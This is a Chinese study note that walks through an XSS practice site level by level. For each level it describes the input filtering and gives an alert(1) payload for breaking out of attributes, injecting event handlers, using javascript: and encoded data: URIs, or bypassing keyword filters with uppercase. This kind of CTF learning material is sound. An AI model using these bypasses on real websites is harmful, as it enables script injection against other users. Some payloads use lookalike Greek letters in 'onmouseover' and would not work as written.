## 前置知识

XSS 目标：尽可能找到一切**用户输入**并且能够**输出在页面代码**中的地方。

## 实战

### level1 [XSS 挑战之旅](http://test.xss.tv/) 

最简单的xss漏洞 

xss 绕过尖括号和双引号转义

```bash
<script>alert(1)</script>
```

### level2  [XSS 挑战之旅](http://test.xss.tv/) 

在<h2>标签中，‘<>’符号被转译，但在<input>标签中‘value’的值完整显示了输入的payload，尝试闭合value的值，在输入框重新构造xss注入代码

```bash
"><script>alert(1);</script>
```

### level3 [XSS 挑战之旅](http://test.xss.tv/) 

在<h2>和<input>标签中，‘<>’符号均被转译 , 尝试闭合‘value’的值，通过事件触发弹窗，在输入框构造新的payload： 

```bash
' οnmοuseοver='alert(1)
或
'autofocus onfocus=alert(1) x='
```

level4 [XSS 挑战之旅](http://test.xss.tv/) 

在<h2>标签中，‘<">’被编码，<input>标签里‘value’中的’<>'被替换为空白，尝试闭合‘value’的值，通过事件触发弹窗，在输入框构造新的payload：

```bash
" οnmοuseοver="alert(1)
```

level5 [XSS 挑战之旅](http://test.xss.tv/) 

<input>标签里 script 和 on 关键字都被过滤

只有在尖括号里面的 script 才会被过滤，on 在任何时刻都会被过滤。

h2标签中 双引号和尖括号都被过滤了，单引号没有。

因此使用 javascript 关键字触发 alert 

```bash
"><a href=javascript:alert(1)>点我点我</a>

# 还可使用 url 编码的方式绕过字节流
"><iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>"<
```

level6

情况和上一题差不多，但是这次script on src data 关键字都被过滤了，使用大写就可以。

考察关键字的绕过方法。 src 大写即可绕过关键字过滤。

考察 html 语法的特点：**HTML 大小写**不敏感，不**区分大小写**，也就是说**大小写**都不影响。 但根据W3C的规范写法，一般使用小写。

```bash
"><img SRC=javascript:alert(1) ><"
```

### todo

http://test.ctf8.com/level7.php?keyword=move up!

### 第三题 https://xss-game.appspot.com/level3

用户输入内容直接被放置到 image标签中。且使用的是单引号

```bash
'><script>alert(1)</script>
```

## 参考链接

- [XSS跨站漏洞详解](https://zhuanlan.zhihu.com/p/43877060)
- [xss ctf wiki](https://ctf-wiki.github.io/ctf-wiki/web/xss-zh/)
- [记一次xss漏洞挖掘](https://zhuanlan.zhihu.com/p/77639006)
- [XSS过滤绕过速查表](https://www.freebuf.com/articles/web/153055.html) 
- [XSS平台 XSS挑战之旅 解题记录 writeup](https://blog.csdn.net/weixin_44037296/article/details/98342199)

